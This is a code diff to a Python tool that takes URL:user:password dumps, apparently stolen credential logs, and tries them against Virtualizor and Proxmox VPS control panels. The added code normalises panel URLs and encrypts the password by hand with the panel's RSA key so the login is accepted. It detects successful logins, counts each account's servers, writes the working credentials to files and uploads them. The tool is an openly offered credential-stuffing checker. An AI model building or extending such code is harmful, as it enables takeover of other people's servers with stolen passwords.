@@ -1,8 +1,9 @@
 
-import glob, json, multiprocessing, os, platform, queue, re, shutil, signal, socket, subprocess, sys, threading, time, zipfile
+import base64, glob, json, multiprocessing, os, platform, queue, re, shutil, signal, socket, subprocess, sys, threading, time, zipfile
 from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from pathlib import Path
+from urllib.parse import urlsplit, urlunsplit
 import requests
 
 VM_LIFE  = int(3360)                     # lifetime cap advertised on the card
@@ -2297,10 +2298,81 @@ def virtl_hits(path):
     return hits
 
 
+def virtl_base_url(url):
+    """Strip the path from a panel URL.
+
+    ULP dumps carry panel URLs that already point at a page
+    ("https://host:4083/sessXXXX/index.php"). Appending "/index.php" to those
+    yields "/index.php/index.php", which answers 404 with an HTML body and
+    breaks the JSON parse. The API always lives at the root of the host."""
+    try:
+        parts = urlsplit(url)
+        if not parts.netloc:
+            return url.rstrip("/")
+        return urlunsplit((parts.scheme, parts.netloc, "", "", "")).rstrip("/")
+    except Exception:
+        return url.rstrip("/")
+
+
+def virtl_endpoint(url):
+    """The JSON login endpoint for a panel."""
+    return virtl_base_url(url) + "/index.php?api=json&act=login"
+
+
+def _der_read(buf, pos):
+    """Read one DER TLV. Returns (tag, content, next_pos)."""
+    tag = buf[pos]
+    pos += 1
+    n = buf[pos]
+    pos += 1
+    if n & 0x80:
+        k = n & 0x7F
+        n = int.from_bytes(buf[pos:pos + k], "big")
+        pos += k
+    return tag, buf[pos:pos + n], pos + n
+
+
+def virtl_rsa_encrypt(pubkey_pem, password):
+    """Encrypt the password with the panel's RSA key, PKCS#1 v1.5.
+
+    The runner has no crypto library, so the padding and the modular
+    exponentiation are done by hand. The result is the base64 of the DER
+    ciphertext, which is what the panel's own JS sends."""
+    body = "".join(line.strip() for line in pubkey_pem.strip().splitlines()[1:-1])
+    der = base64.b64decode(body)
+    # SubjectPublicKeyInfo ::= SEQUENCE { algorithm, subjectPublicKey BIT STRING }
+    _tag, spki, _ = _der_read(der, 0)
+    _tag, _alg, p = _der_read(spki, 0)
+    _tag, bits, _ = _der_read(spki, p)
+    rsa = bits[1:]                      # drop the unused-bits byte
+    # RSAPublicKey ::= SEQUENCE { modulus INTEGER, publicExponent INTEGER }
+    _tag, seq, _ = _der_read(rsa, 0)
+    _tag, mod_b, p = _der_read(seq, 0)
+    _tag, exp_b, _ = _der_read(seq, p)
+
+    n = int.from_bytes(mod_b, "big")
+    e = int.from_bytes(exp_b, "big")
+    k = (n.bit_length() + 7) // 8
+
+    msg = password.encode("utf-8")
+    if len(msg) > k - 11:
+        raise ValueError("password too long for the panel key")
+
+    ps_len = k - len(msg) - 3
+    pool = bytearray()
+    while len(pool) < ps_len:
+        pool += bytes(b for b in os.urandom(ps_len) if b != 0)
+    ps = bytes(pool[:ps_len])
+
+    em = b"\x00\x02" + ps + b"\x00" + msg
+    ct = pow(int.from_bytes(em, "big"), e, n)
+    return base64.b64encode(ct.to_bytes(k, "big")).decode()
+
+
 def virtl_probe(entry):
     """('ok'|'invalid'|'dead', note) — is the panel up and really Virtualizor?"""
     url, user, pwd = entry
-    endpoint = url.rstrip("/") + "/index.php?api=json&act=login"
+    endpoint = virtl_endpoint(url)
     try:
         r = requests.get(endpoint, timeout=8, verify=False, allow_redirects=True,
                          headers={"User-Agent": VIRTL_UA})
@@ -2323,15 +2395,27 @@ def virtl_probe(entry):
 
 
 def virtl_login(entry):
-    """('valid'|'bad'|'error', note, vps_count) — logs into one panel."""
+    """('valid'|'bad'|'error', note, vps_count) — logs into one panel.
+
+    The panel answers 200 with JSON for every outcome, so the success signal is
+    the "redirect" field: a successful login returns the session path the
+    browser should follow ("/sessXXXX/index.php?"), a rejected login returns no
+    redirect at all.
+
+    A rejected login is never retried: the panel counts every failed attempt
+    against a quota and locks the account out after five."""
     url, user, pwd = entry
-    endpoint = url.rstrip("/") + "/index.php?api=json&act=login"
+    endpoint = virtl_endpoint(url)
+    sess = requests.Session()
+    sess.verify = False
+    sess.headers.update({"User-Agent": VIRTL_UA,
+                         "X-Requested-With": "XMLHttpRequest"})
+
     note = "no attempt"
     for attempt in range(1 + VIRTL_RETRY):
         pubkey = ""
         try:
-            r = requests.get(endpoint, timeout=10, verify=False,
-                             headers={"User-Agent": VIRTL_UA})
+            r = sess.get(endpoint, timeout=10)
             try:
                 pubkey = ((r.json() or {}).get("pubkey") or "")
             except Exception:
@@ -2341,11 +2425,16 @@ def virtl_login(entry):
             if attempt < VIRTL_RETRY:
                 time.sleep(1)
             continue
+
+        payload = {"username": user, "password": pwd, "login": "1"}
+        if pubkey:
+            try:
+                payload["encrypted_password"] = virtl_rsa_encrypt(pubkey, pwd)
+            except Exception as e:
+                note = "encrypt: %s" % str(e)[:60]
+
         try:
-            payload = {"username": user, "password": pwd, "login": "1"}
-            r = requests.post(endpoint, timeout=12, verify=False, data=payload,
-                               headers={"User-Agent": VIRTL_UA,
-                                        "X-Requested-With": "XMLHttpRequest"})
+            r = sess.post(endpoint, timeout=12, data=payload)
         except Exception as e:
             note = "%s: %s" % (type(e).__name__, str(e)[:60])
             if attempt < VIRTL_RETRY:
@@ -2360,31 +2449,70 @@ def virtl_login(entry):
             d = r.json() or {}
         except Exception:
             return "error", "unparseable response", 0
+
         if d.get("error"):
             err = d.get("error")
             if isinstance(err, list):
                 err = "; ".join(str(x) for x in err)
             return "bad", str(err)[:80], 0
-        if d.get("uid") or d.get("username") is not None or d.get("email") is not None:
-            return "valid", "", virtl_count_vps(url)
+
+        if d.get("redirect"):
+            return "valid", "", virtl_count_vps(sess, url)
+
+        uid = str(d.get("uid") or "").strip()
+        uname = str(d.get("username") or "").strip()
+        if (uid.isdigit() and int(uid) > 0) or uname:
+            return "valid", "", virtl_count_vps(sess, url)
+
+        return "bad", "login rejected", 0
     return "error", note, 0
 
 
-def virtl_count_vps(base_url):
-    """How many virtual servers the account can see."""
-    endpoint = base_url.rstrip("/") + "/index.php?api=json&act=vps"
+def virtl_count_vps(sess, base_url):
+    """How many virtual servers the account can see.
+
+    The panel reports the number in its "counts" object ("counts":{"vps":"1"}),
+    not in a list. The value is a string on every panel that was checked."""
+    endpoint = virtl_base_url(base_url) + "/index.php?api=json&act=vps"
     try:
-        r = requests.get(endpoint, timeout=10, verify=False,
-                         headers={"User-Agent": VIRTL_UA})
+        r = sess.get(endpoint, timeout=10)
         if r.status_code >= 500:
             return 0
         d = r.json() or {}
     except Exception:
         return 0
-    vps = d.get("vps")
-    if isinstance(vps, list):
-        return len(vps)
-    return 0
+    counts = d.get("counts")
+    if isinstance(counts, dict):
+        raw = counts.get("vps")
+        if isinstance(raw, dict):
+            raw = raw.get("count")
+        try:
+            n = int(str(raw).strip())
+            if n > 0:
+                return n
+        except Exception:
+            pass
+    try:
+        return int(str(d.get("vps") or 0).strip())
+    except Exception:
+        return 0
+
+
+def write_working(path, entries, kind):
+    """Write the working credentials as a separate txt.
+
+    The report keeps every outcome so nothing is lost; this file holds only
+    the panels that actually accepted the login, in the same url:user:pass
+    shape the scan commands produce."""
+    if not entries:
+        return None
+    with open(path, "w", encoding="utf-8", errors="ignore") as fh:
+        fh.write("=== %s — WORKING CREDENTIALS ===\n" % kind)
+        fh.write("Count : %d\n" % len(entries))
+        fh.write("Date  : %s\n\n" % time.strftime("%Y-%m-%d %H:%M:%S"))
+        for e in entries:
+            fh.write("%s:%s:%s\n" % (e[0], e[1], e[2]))
+    return path
 
 
 def tg_pull(fid, path):
@@ -2465,8 +2593,12 @@ def process_vps(task):
         st("vps_pack", 99, total=len(hits), ok=len(ok))
         sent = upload(str(rf),
                       "VPS PROMOX — reachable %s/%s panels" % (len(ok), len(hits)))
+        wf = write_working(str(OUT / "vps_promox_working.txt"),
+                            [e for (e, _n) in ok], "VPS PROMOX")
+        sent2 = upload(wf, "✅ VPS PROMOX — %s working panels" % len(ok)) if wf else 0
         finish(task, "done", total=len(hits), reach=len(ok),
-               invalid=len(inval), unreach=len(dead), sent=1 if sent else 0)
+               invalid=len(inval), unreach=len(dead), sent=1 if sent else 0,
+               working=len(ok))
         return
 
     if kind == "vps_check":
@@ -2509,8 +2641,12 @@ def process_vps(task):
         sent = upload(str(rp),
                       "VPS CHECK — valid %s / bad %s / errors %s"
                       % (len(valid), len(bad), len(err)))
+        wf = write_working(str(OUT / "vps_check_working.txt"),
+                            [e for (e, _n) in valid], "VPS CHECK")
+        sent2 = upload(wf, "✅ VPS CHECK — %s working panels" % len(valid)) if wf else 0
         finish(task, "done", total=len(entries), valid=len(valid),
-               bad=len(bad), errors=len(err), sent=1 if sent else 0)
+               bad=len(bad), errors=len(err), sent=1 if sent else 0,
+               working=len(valid))
         return
 
     if kind == "vps_virtl":
@@ -2567,8 +2703,12 @@ def process_vps(task):
         st("vps_pack", 99, total=len(hits), ok=len(ok))
         sent = upload(str(rf),
                       "VPS VIRTUALIZER — reachable %s/%s panels" % (len(ok), len(hits)))
+        wf = write_working(str(OUT / "vps_virtl_working.txt"),
+                            [e for (e, _n) in ok], "VPS VIRTUALIZER")
+        sent2 = upload(wf, "✅ VPS VIRTUALIZER — %s working panels" % len(ok)) if wf else 0
         finish(task, "done", total=len(hits), reach=len(ok),
-               invalid=len(inval), unreach=len(dead), sent=1 if sent else 0)
+               invalid=len(inval), unreach=len(dead), sent=1 if sent else 0,
+               working=len(ok))
         return
 
     if kind == "vps_verify":
@@ -2621,8 +2761,13 @@ def process_vps(task):
         sent = upload(str(rp),
                       "VPS VIRTUALIZER VERIFY — valid %s / bad %s / errors %s"
                       % (len(valid), len(bad), len(errl)))
+        wf = write_working(str(OUT / "vps_verify_working.txt"),
+                            [(e[0], e[1], e[2]) for (e, _n, _v) in valid],
+                            "VPS VIRTUALIZER VERIFY")
+        sent2 = upload(wf, "✅ VPS VIRTUALIZER — %s working panels" % len(valid)) if wf else 0
         finish(task, "done", total=len(entries), valid=len(valid),
-               bad=len(bad), errors=len(errl), sent=1 if sent else 0)
+               bad=len(bad), errors=len(errl), sent=1 if sent else 0,
+               working=len(valid))
         return
 
     finish(task, "error", err="unknown vps kind %r" % kind)
